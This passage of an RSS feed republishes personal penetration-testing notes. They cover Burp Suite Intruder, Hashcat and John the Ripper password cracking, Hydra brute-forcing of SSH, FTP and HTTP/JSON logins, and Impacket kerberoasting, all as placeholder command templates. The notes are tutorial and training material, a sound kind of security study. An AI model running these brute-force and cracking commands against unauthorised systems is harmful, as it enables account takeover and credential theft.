attempts:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;foo=one&amp;amp;bar=alpha&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=one&amp;amp;bar=beta&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=one&amp;amp;bar=gamma&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=two&amp;amp;bar=alpha&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=two&amp;amp;bar=beta&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=two&amp;amp;bar=gamma&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=three&amp;amp;bar=alpha&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=three&amp;amp;bar=beta&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=three&amp;amp;bar=gamma&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;This is a good approach for attacking login forms if you &lt;em&gt;don't&lt;/em&gt; already know the actual credentials, but want to fuzz using some set of likely values (like &lt;code&gt;rockyou.txt&lt;/code&gt;).&lt;/p&gt;&lt;p&gt;Obviously this is the most expensive attack in terms of connections/time, and thus also the one most likely to get you noticed!&lt;/p&gt;&lt;h2 id=&quot;macros&quot;&gt;Macros&lt;/h2&gt;&lt;p&gt;When dealing with forms that include session cookies or anti-CSRF tokens, we can either grab these tokens directly in Intruder using the Recursive Grep function (within the Intruder module), or construct a macro in Project options &amp;gt; Sessions &amp;gt; Macros (necessary if there's, for example, a random redirect to make our life harder).&lt;/p&gt;&lt;p&gt;Basically, macros just define repeated requests that we can make. Once a request is defined here, we can add an entry in Session Handling Rules and define the Scope of the macro (the tools it's active in and the URL it applies to). Then in details we can trigger the macro. Generally you'll want to restrict the URLs the macro applies to and what parameters/cookies get updated by the macro as much as possible.&lt;/p&gt;&lt;h2 id=&quot;hashing-in-decoder&quot;&gt;Hashing in Decoder&lt;/h2&gt;&lt;p&gt;Burp Suite displays hashes in the &quot;Hex&quot; view by default; to convert them into the (hex) ASCII string you're used to, encode this output as &quot;ASCII Hex&quot;.&lt;/p&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Burp%20Suite.md</guid>
		</item>
		<item>
			<title>Using Hashcat</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Hashcat.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;hashcat&lt;/span&gt; -m &lt;span class=&quot;va&quot;&gt;$TYPE&lt;/span&gt; -O &lt;span class=&quot;va&quot;&gt;$HASHFILE&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$WORDLIST&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here &lt;code&gt;$TYPE&lt;/code&gt; is the hash type (check &lt;code&gt;man hashcat&lt;/code&gt;), and &lt;code&gt;-O&lt;/code&gt; requests that Hashcat use an optimized kernel (faster, but limited in the password length that can be cracked). Note that instead of &lt;code&gt;$HASHFILE&lt;/code&gt;, a raw hash can be provided directly instead (the &lt;code&gt;hash-identifier&lt;/code&gt; tool on Kali Linux can help narrow down the kind of hash being dealt with in these situations).&lt;/p&gt;&lt;p&gt;Some values of &lt;code&gt;-m&lt;/code&gt;:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;0 â md5&lt;/li&gt;&lt;li&gt;100 â sha1&lt;/li&gt;&lt;li&gt;900 â md4&lt;/li&gt;&lt;li&gt;1000 â NTLM (Windows)&lt;/li&gt;&lt;li&gt;1400 â sha256&lt;/li&gt;&lt;li&gt;1800 â UNIX SHA-512 passwords (&lt;code&gt;$6$&lt;/code&gt;)&lt;/li&gt;&lt;li&gt;3000 -âLANMAN (Windows)&lt;/li&gt;&lt;li&gt;3200 â bcrypt&lt;/li&gt;&lt;li&gt;13100 â Kerberos 5 hashes (TGS-REP)&lt;/li&gt;&lt;li&gt;18200 â Kerberos 5 hashes (AS-REP)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;There are a large number of âRaw Hash, Salted and/or Iteratedâ modes That allow raw salted hashes (i.e., those not specific to a particular password type) to be processed; for these, specify the hashes as &lt;code&gt;$HASH:$SALT&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Passwords are output as &lt;code&gt;HASH:PLAINTEXT&lt;/code&gt; tuples.&lt;/p&gt;&lt;p&gt;Hashcat can accept the output of hashdump from Metasploit (use &lt;code&gt;-m 1000&lt;/code&gt;), as well as raw hashes from &lt;code&gt;/etc/shadow&lt;/code&gt; (assuming that theyâre all the same type).&lt;/p&gt;&lt;p&gt;A âtoken length exceptionâ means that the provided hash format is of the wrong length (probably because an additional character got accidentally added).&lt;/p&gt;&lt;h3 id=&quot;additional-resources&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://pentesthacker.com/2020/12/27/kali-hashcat-and-john-the-ripper-crack-windows-password-hashdump/&quot;&gt;Kali Hashcat and John the Ripper Crack Windows Password hashdump&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://samsclass.info/123/proj10/p12-hashcat.htm&quot;&gt;Cracking Linux Password Hashes with Hashcat&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://security.stackexchange.com/a/204978&quot;&gt;hashcat - cracking a salted sha256&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/passwordattacks&quot;&gt;TryHackMe: Password Attacks&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;combinator&quot;&gt;Combinator&lt;/h2&gt;&lt;p&gt;The Hashcat &lt;code&gt;combinator.bin&lt;/code&gt; utility combines two wordlists such that every entry of the first list is concatenated with every entry from the second list.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;/usr/lib/hashcat-utils/combinator.bin&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;$WORDLIST1&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$WORDLIST2&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$COMBINED_WORDLIST&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;brute-force-attacks&quot;&gt;Brute-Force Attacks&lt;/h2&gt;&lt;p&gt;Hashcat can also produce lists for brute forcing using the &lt;code&gt;-a 3&lt;/code&gt; flag. If no hash is provided, then a simple list will be produced.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Produce a list of 4-digit PINs&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;hashcat&lt;/span&gt; -a 3 ?d?d?d?d âstdout&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-5&quot;&gt;&lt;a href=&quot;#cb3-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Crack an MD5 hash of a 4-digit PIN using brute-forcing&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-6&quot;&gt;&lt;a href=&quot;#cb3-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-7&quot;&gt;&lt;a href=&quot;#cb3-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;hashcat&lt;/span&gt; -a 3 -m 0 &lt;span class=&quot;va&quot;&gt;$MD5_HASH&lt;/span&gt; ?d?d?d?d&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;hashcat --help&lt;/code&gt; command will display all available character sets (the &lt;code&gt;d&lt;/code&gt; in the above example).&lt;/p&gt;&lt;h3 id=&quot;additional-resources-1&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/passwordattacks&quot;&gt;TryHackMe: Password Attacks&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Hashcat.md</guid>
		</item>
		<item>
			<title>Using Hydra</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Hydra.md</link>
			<description>&lt;p&gt;Hydra can actually brute-force remote services, though I have some skepticism about how useful this is in practice.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;hydra&lt;/span&gt; -t 4 -l &lt;span class=&quot;va&quot;&gt;$USER_NAME&lt;/span&gt; -P &lt;span class=&quot;va&quot;&gt;$WORDLIST&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;      &lt;span class=&quot;ex&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$TARGET_IP_ADDRESS&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$SERVICE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here &lt;code&gt;$SERVICE&lt;/code&gt; is âsshâ, âftpâ, etc. Note that âhttpâ is not used directly; instead use âhttp-get-formâ, âhttp-post-formâ, etc.&lt;/p&gt;&lt;h2 id=&quot;options&quot;&gt;Options&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;-f&lt;/code&gt; - Stop after the first successful match. Useful if you are just trying to brute-force a single username!&lt;/li&gt;&lt;li&gt;&lt;code&gt;-l&lt;/code&gt; - Specify the username whose password you want to brute force.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-L&lt;/code&gt; - Specify a file listing of usernames (one per line) you want to brute force.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; - Specify the password you want to attempt. Most useful in conjunction with &lt;code&gt;-L&lt;/code&gt; for password spraying attacks.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-P&lt;/code&gt; - Specify a file listing of passwords (one per line) you want to brute force.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-s&lt;/code&gt; - Use a non-default port for &lt;code&gt;$SERVICE&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-t&lt;/code&gt; - Specifies the number of threads (parallel connection attempts) that Hydra should make at any one time. By default, Hydra uses 16 threads, but many services donât seem to play well with this; &lt;code&gt;-t 4&lt;/code&gt; is a much more sane value.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-V&lt;/code&gt; - Verbose output. Use &lt;code&gt;-vV&lt;/code&gt; for even more verbose output, or &lt;code&gt;-d&lt;/code&gt; for debugging output.&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;additional-resources&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/passwordattacks&quot;&gt;TryHackMe: Password Attacks&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;http-logins&quot;&gt;HTTP Logins&lt;/h2&gt;&lt;p&gt;When using Hydra to brute force an HTTP login, additional syntax is required after the protocol specifier (&lt;code&gt;http-get-form&lt;/code&gt; or &lt;code&gt;http-post-form&lt;/code&gt;). The syntax for each type of request can be looked up using &lt;code&gt;hydra $SERVICE -U&lt;/code&gt;; use the placeholders &lt;code&gt;^USER^&lt;/code&gt; and &lt;code&gt;^PASS^&lt;/code&gt; to substitute in the username and password guesses. Condition strings &lt;code&gt;S=&lt;/code&gt; and &lt;code&gt;F=&lt;/code&gt; are simple string matches in the returned data for a successful and failed login, respectively.&lt;/p&gt;&lt;p&gt;See the following section on using Hydra to attack JSON APIs for an example of what this looks like.&lt;/p&gt;&lt;h3 id=&quot;additional-resources-1&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/passwordattacks&quot;&gt;TryHackMe: Password Attacks&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;attacking-api-endpoints-using-json&quot;&gt;Attacking API Endpoints Using JSON&lt;/h2&gt;&lt;p&gt;Hydra can be used to attack API endpoints that accept JSON (though apparently there can be some problems with the headers that are passed along):&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;hydra&lt;/span&gt; -vV -f -l &lt;span class=&quot;va&quot;&gt;$USERNAME&lt;/span&gt; -P &lt;span class=&quot;va&quot;&gt;$PASSWORDLIST&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;$HOST&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;http-post-form&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;$ENDPOINT&lt;/span&gt;:&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$TEMPLATE&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;F=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$INVALID&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;:H=&lt;span class=&quot;st&quot;&gt;&amp;quot;Content-Type\: application/json&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;$TEMPLATE&lt;/code&gt; is basically the JSON request body with the special placeholders &lt;code&gt;^USER^&lt;/code&gt; and &lt;code&gt;^PASS^&lt;/code&gt; (colons escaped). &lt;code&gt;$INVALID&lt;/code&gt; is a string that will appear for login &lt;em&gt;failures&lt;/em&gt; (note that this string &lt;em&gt;cannot&lt;/em&gt; contain a colon, but fortunately is a substring match). The &lt;code&gt;H&lt;/code&gt; parameter at the end allows us to override specific headers (necessary because otherwise Hydra sends a &lt;code&gt;Content-Type&lt;/code&gt; of &lt;code&gt;application/x-www-form-urlencoded&lt;/code&gt;).&lt;/p&gt;&lt;h3 id=&quot;additional-resources-2&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://security.stackexchange.com/questions/57839/hydra-bruteforce-and-json&quot;&gt;Hydra bruteforce and JSON&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://security.stackexchange.com/questions/203501/bruteforce-using-hydra-with-json&quot;&gt;Bruteforce - Using Hydra with JSON&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Hydra.md</guid>
		</item>
		<item>
			<title>Using Impacket</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Impacket.md</link>
			<description>&lt;h2 id=&quot;kerberoasting&quot;&gt;Kerberoasting&lt;/h2&gt;&lt;p&gt;Impacket can identify kerberoastable accounts and dump packets remotely. It comes standard with Kali Linux.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;/usr/share/doc/python3-impacket/examples/GetUserSPNs.py&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;${DOMAIN}&lt;/span&gt;&lt;span class=&quot;ex&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;${USER}&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;${PASSWORD}&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-dc-ip&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$DOMAIN_CONTROLLER_IP&lt;/span&gt; -request&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The password hashes output here can then be cracked with Hashcat (use the 13100 hash mode).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Kerberos.md&quot;&gt;Kerberos&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Hashcat.md&quot;&gt;Using Hashcat&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;as-rep-roasting&quot;&gt;AS-REP Roasting&lt;/h2&gt;&lt;p&gt;Impacket (via GetNPUsers.py) support AS-REP roasting. However, GetNPUsers.py requires that user accounts already be enumerated and roastable accounts identified.&lt;/p&gt;&lt;p&gt;When using GetNPUsers.py, specify the target as &lt;code&gt;${DOMAIN}/&lt;/code&gt; (i.e., leave off the user-part).&lt;/p&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Impacket.md</guid>
		</item>
		<item>
			<title>Using John the Ripper</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20John%20the%20Ripper.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;john&lt;/span&gt; --format=&lt;span class=&quot;va&quot;&gt;$HASH_FORMAT&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;--wordlist&lt;/span&gt;=&lt;span class=&quot;va&quot;&gt;$WORDLIST&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$PASSWORD_HASH_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Using the &lt;code&gt;--format&lt;/code&gt; option is recommended, as many different hash formats have the same basic appearance, which makeâs johnâs attempt to guess the hash format without this information somewhat unreliable. John can only crack one type of hash at a time â no mixing-and-matching of hash formats. Use &lt;code&gt;--list=formats&lt;/code&gt; to see available formats.&lt;/p&gt;&lt;p&gt;John the Ripper can accept the output of hashdump from Metasploit (use &lt;code&gt;--format=NT&lt;/code&gt;).&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; John the Ripper records cracked hash:password tuples in &lt;code&gt;~/.john/john.pot&lt;/code&gt;, and then references this file to avoid cracking known hashes. It &lt;em&gt;doesnât&lt;/em&gt; output these passwords again (instead simply declaring â[n]o password hashes left to crackâ), so if you get no output then youâll want to just grep for your hash in john.pot.&lt;/p&gt;&lt;h3 id=&quot;additional-resources&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://pentesthacker.com/2020/12/27/kali-hashcat-and-john-the-ripper-crack-windows-password-hashdump/&quot;&gt;Kali Hashcat and John the Ripper Crack Windows Password hashdump&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Metasploit.md&quot;&gt;Using Metasploit&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;single-crack-mode&quot;&gt;Single Crack Mode&lt;/h2&gt;&lt;p&gt;Johnâs âsingle crack modeâ (&lt;code&gt;--single&lt;/code&gt;) is just about exploiting bad password practice - basing passwords off of the username, or details of the operating system. It can be used over âunshadowedâ UNIX-style passwords (in which case it will exploit not only the username, but data from other GECOS fields), or on single hashes (in which case the hash must be written as USERNAME:HASH so that John has something to go off of).&lt;/p&gt;&lt;p&gt;Obviously, a wordlist is not required in single crack mode.&lt;/p&gt;&lt;h2 id=&quot;custom-rules&quot;&gt;Custom Rules&lt;/h2&gt;&lt;p&gt;People typically add âcomplexityâ to a password by appending or prepending the required numbers and symbols (capital letters generally live on either the beginning or end of the password).&lt;/p&gt;&lt;p&gt;Johnâs rules can be used to construct additional permutations of a wordlist to cover these cases. The rule syntax is weird, but close enough to regexps to be vaguely readable. Examples can be found in &lt;code&gt;/etc/john/john.conf&lt;/code&gt; (the comments make for interesting reading), and a given ruleset from this file can be specified with &lt;code&gt;--rules&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Rulesets are particularly useful when expanding a wordlist or (potential) password list of the sort that can be generated by &lt;code&gt;cewl&lt;/code&gt; or CUPP.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;john&lt;/span&gt; --wordlist=&lt;span class=&quot;va&quot;&gt;$WORD_LIST&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;--rules&lt;/span&gt;=&lt;span class=&quot;va&quot;&gt;$RULE_SET&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;--stdout&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$OUTFILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When in doubt, &lt;code&gt;--rules=KoreLogic&lt;/code&gt; is a solid choice.&lt;/p&gt;&lt;h3 id=&quot;additional-resources-1&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22cewl%22.md&quot;&gt;Using âcewlâ&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20CUPP.md&quot;&gt;Using CUPP&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/passwordattacks&quot;&gt;TryHackMe: Password Attacks&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;helper-applications&quot;&gt;Helper Applications&lt;/h2&gt;&lt;p&gt;&lt;code&gt;hash-identifier&lt;/code&gt; will indicate what hash types match the data in &lt;code&gt;$PASSWORD_HASH_FILE&lt;/code&gt;. Use this + information about the province of the hashes to choose a likely format. Also useful in conjunction with Hashcat. (Note that the hash names used by &lt;code&gt;hash-identifier&lt;/code&gt; do &lt;em&gt;not&lt;/em&gt; correspond to those used by John the Ripper.)&lt;/p&gt;&lt;p&gt;&lt;code&gt;unshadow&lt;/code&gt; transforms &lt;code&gt;/etc/passwd&lt;/code&gt; + &lt;code&gt;/etc/shadow&lt;/code&gt; files (or matching subsets of these files) into a format John understands (note that &lt;code&gt;--format&lt;/code&gt; is not generally necessary when having John crack the output on unshadow, as UNIX password hashes already specify their type).&lt;/p&gt;&lt;p&gt;&lt;code&gt;zip2john&lt;/code&gt; extracts information from encrypted zip files in a format suitable for John to ingest.&lt;/p&gt;&lt;p&gt;&lt;code&gt;rar2john&lt;/code&gt; extracts information from encrypted rar files in a format suitable for John to ingest.&lt;/p&gt;&lt;p&gt;&lt;code&gt;python2 /usr/share/john/ssh2john.py&lt;/code&gt; extracts information from encrypted SSH key files in a format suitable for John to ingest. Note that John is susceptible to false positives when cracking ssh keys, and will thus try the entire provided wordlist (just in case!).&lt;/p&gt;&lt;h2 id=&quot;additional-resources-2&quot;&gt;Additional Resources&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Hashcat.md&quot;&gt;Using Hashcat&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Linux%20%28and%20BSD%29%20Password%20Hashes.md&quot;&gt;Linux (and BSD) Password Hashes&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20John%20the%20Ripper.md</guid>
		</item>
		<item>
			<title>Using Kerbrute</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Kerbrute.md</link>
